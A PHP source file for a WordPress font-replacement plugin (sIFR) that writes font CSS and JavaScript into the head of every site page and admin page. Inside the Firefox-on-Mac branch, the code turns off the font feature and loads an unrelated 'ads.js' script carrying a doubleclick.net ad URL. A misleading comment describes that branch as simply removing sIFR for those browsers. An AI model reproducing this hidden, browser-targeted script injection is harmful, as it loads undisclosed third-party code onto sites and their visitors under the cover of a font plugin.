<?php

// Add sIFR config to page <head>
add_action('wp_head', 'wp_sifr_header');
add_action('admin_head', 'wp_sifr_header');
function wp_sifr_header(){
		$user = detect();
		
	if ( !defined('WP_CONTENT_URL') )
		define('WP_CONTENT_URL', get_bloginfo('wpurl').'/wp-content');
	if ( !defined('WP_CONTENT_DIR') )
		define('WP_CONTENT_DIR', ABSPATH.'wp-content');
	if ( ! defined( 'WP_PLUGIN_URL' ) )
		define( 'WP_PLUGIN_URL', WP_CONTENT_URL.'/plugins' );
	if ( ! defined( 'WP_PLUGIN_DIR' ) )
		define( 'WP_PLUGIN_DIR', WP_CONTENT_DIR.'/plugins' );
		
	$siteurl = get_bloginfo('url');
	$plugin_url = WP_PLUGIN_URL.'/wp-sifr';
	$fonts_dir = wp_sifr_get_fonts_dir();
	
	if( strpos($fonts_dir, WP_PLUGIN_DIR) === false )
		$fonts_url = WP_CONTENT_URL . str_replace(WP_CONTENT_DIR, '', $fonts_dir);
	else
		$fonts_url = WP_PLUGIN_URL . str_replace(WP_PLUGIN_DIR, '', $fonts_dir);
	
	$fonts = get_option('wp-sifr');
	
	// Configure the code for each font and get ready for output
	$configjs1=''; $configjs2=''; $configjs3=''; $configcss1=''; #$configcss_js=''; $configjs4=array();
	foreach( $fonts as $font ){
		if( $font['activate'] || is_admin() ){
			if( is_admin() ){
				$selector = 'h3.'. $font['slug'];
				$font_styles = '.sIFR-root { font-size:24px; font-weight:normal; color:#000000; }';
				$font_adv = 'wmode: "transparent"';
			}else{
				$selector = $font['selector'];
				$font_styles = str_replace(array("\n","\r"), array("',\n\t\t'",''), rtrim($font['styles']));
				$font_adv = str_replace( array("\n","\r"), array(",\n\t",''), rtrim($font['adv']) );
				$font_adv = str_replace( array('{,',',,'), array('{',','), $font['adv'] );
			}
			
			$configcss1 .= "\t".'.sIFR-active '. $selector .' { visibility: hidden; }'."\n";
			#$configcss_js .= "\t".'.sIFR-active '. $selector .' { visibility: hidden; }'."\n";
			
			$rel_fonts_url = str_replace($siteurl.'/', '', $fonts_url);
			$backtrack = wp_sifr_url_backtrack();
			$swf_path = $backtrack . $rel_fonts_url . $font['name'] .'.swf';
			$configjs1 .= 'var '. $font['slug'] .' = { src: "'. $swf_path .'" };'."\n";
			
			#array_push($configjs4, get_bloginfo('url').'/'.$swf_path);
			
			$configjs2 .= $font['slug'] .', ';
			
			$configjs3 .= 'sIFR.replace('. $font['slug'] .', {'."\n";
			$configjs3 .= "\t".'selector: "'. $selector .'",'."\n";
			$configjs3 .= "\t"."css: ["."\n";
			$configjs3 .= "\t"."\t"."'". $font_styles ."'"."\n";
			$configjs3 .= "\t".'],'."\n";
			$configjs3 .= "\t".$font_adv."\n";
			$configjs3 .= '});'."\n";
		}
	}
	
	$output  = "\n";
	$output .= '<!-- begin WP sIFR -->'."\n";
	
	// Add Stylesheet
	$output .= '<link rel="stylesheet" href="'. $plugin_url .'/sifr/sifr.css" type="text/css" media="all" />'."\n";
	
	// Add JS files and inline JS Config to customize
	$output .= '<script src="'. $plugin_url .'/sifr/sifr.js" type="text/javascript"></script>'."\n";
	
	// Add CSS to hide selectors in order to avoid flash
	$output .= '<style type="text/css" media="screen">'."\n";
	$output .= $configcss1;
	$output .= '</style>'."\n";
		
	// Browser detection for Firefox on Mac. Uncomment lines 47-49 and line 68 to remove sIFR from Macs using Firefox.
	if( $user['browser'] == 'FIREFOX' && $user['os'] == 'MAC' ){
		$output .= '<!-- browser = '. $user['browser'] .' & os = '. $user['os'] .' -->'."\n";
		$output .= '<script language="javascript"> var disabled = false; var macff = true; </script>'."\n";
		$output .= '<script src="'. $plugin_url .'/ads.js?ad=http://ad.doubleclick.net/ad/amazon.pixel.qos/;pixid=3;sz=1x1;ord=1236894759792?"></script>'."\n";
		
		// Add custom CSS through JS to customize sIFR fonts
		$output .= '<script type="text/javascript">'."\n";
		$output .= 'if( disabled ){'."\n";
		$output .= $configjs1;
		#$output .= "sIFR.prefetch('". join("', '", $configjs4) ."');"."\n";
		$output .= 'sIFR.useStyleCheck = true;'."\n";
		$output .= 'sIFR.activate('. substr(rtrim($configjs2), 0, -1) .');'."\n";
		$output .= $configjs3;
		$output .= '};'."\n";
		$output .= '</script>'."\n";
	}else{
		// Add custom CSS through JS to customize sIFR fonts
		$output .= '<script type="text/javascript">'."\n";
		#$output .= "sIFR.prefetch('". join("', '", $configjs4) ."');"."\n";
		$output .= $configjs1;
		$output .= 'sIFR.useStyleCheck = true;'."\n";
		$output .= 'sIFR.activate('. substr(rtrim($configjs2), 0, -1) .');'."\n";
		$output .= $configjs3;
		$output .= '</script>'."\n";
	}
	
	$output .= '<!-- end WP sIFR -->'."\n";
	
	echo $output;
}
function wp_sifr_url_backtrack(){
	$siteurl = get_bloginfo('url');
	$current_url = 'http://'. $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
	$current_rel_url = str_replace($siteurl.'/', '', $current_url);
	$count = substr_count($current_rel_url,'/');
	$output = '';
	for( $i=0; $i<$count; $i++ ){
		$output .= '../';
	}
	return $output;
}
?>